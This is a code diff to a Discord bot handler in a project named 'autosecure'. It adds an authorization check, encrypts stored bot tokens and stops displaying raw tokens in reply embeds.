@@ -4,10 +4,11 @@ const { autosecureMap } = require("../../handlers/botHandler");
 const { autosecurelogs } = require("../../../autosecure/utils/embeds/autosecurelogs");
 const autosecure = require("../../../autosecure/autosecure");
 const checkToken = require("../../../autosecure/utils/utils/checkToken");
-const { owners } = require("../../../config.json");
+const isOwner = require("../../../db/isOwner");
 const showbotmsg = require("../../../autosecure/utils/bot/showbotmsg");
 const { getUserBotNumbers } = require("../../../autosecure/utils/bot/configutils");
 const { getBotIdFromToken, codeblock } = require("../../../autosecure/utils/process/helpers");
+const { encryptToken } = require("../../../autosecure/utils/security/tokenCipher");
 
 module.exports = {
     name: "handlenewbot",
@@ -15,7 +16,12 @@ module.exports = {
     callback: async (client, interaction) => {
         await interaction.deferReply({ ephemeral: true });
 
-        const [t, userid, botnumber] = interaction.customId.split('|');
+        const [t, targetUserId, botnumber] = interaction.customId.split('|');
+        const isAuthorized = interaction.user.id === targetUserId || await isOwner(interaction.user.id);
+        if (!isAuthorized) {
+            return await interaction.editReply({ content: "You are not authorized to create a bot for this user." });
+        }
+        const userid = interaction.user.id;
         const token = interaction.components[0].components[0].value;
 
         let checked = await checkToken(token);
@@ -47,12 +53,16 @@ for (const existingBotNumber of botnumbers) {
                         .setDescription(`<@${botid}> (\`${botid}\`)`)
                         .addFields(
                             {
-                                name: `Token`,
-                                value: codeblock(token)
+                                name: `Bot ID`,
+                                value: codeblock(botid)
                             },
                             {
                                 name: `Bot name`,
                                 value: codeblock(`${existingBotNumber} | ${existingClient.user.username}`)
+                            },
+                            {
+                                name: `Status`,
+                                value: codeblock('Already Running')
                             }
                         )
                         .setColor(0xADD8E6)
@@ -85,15 +95,16 @@ for (const existingBotNumber of botnumbers) {
                 );
 
                 const now = Math.floor(Date.now() / 1000);
+                const encryptedToken = encryptToken(token);
                 if (!bots || bots.length === 0) {
                     await queryParams(
                         `INSERT INTO autosecure (user_id, botnumber, token, creationdate) VALUES (?, ?, ?, ?)`,
-                        [userid, botnumber, token, now]
+                        [userid, botnumber, encryptedToken, now]
                     );
                 } else {
                     await queryParams(
                         `UPDATE autosecure SET token = ?, creationdate = ? WHERE user_id = ? AND botnumber = ?`,
-                        [token, now, userid, botnumber]
+                        [encryptedToken, now, userid, botnumber]
                     );
                 }
 
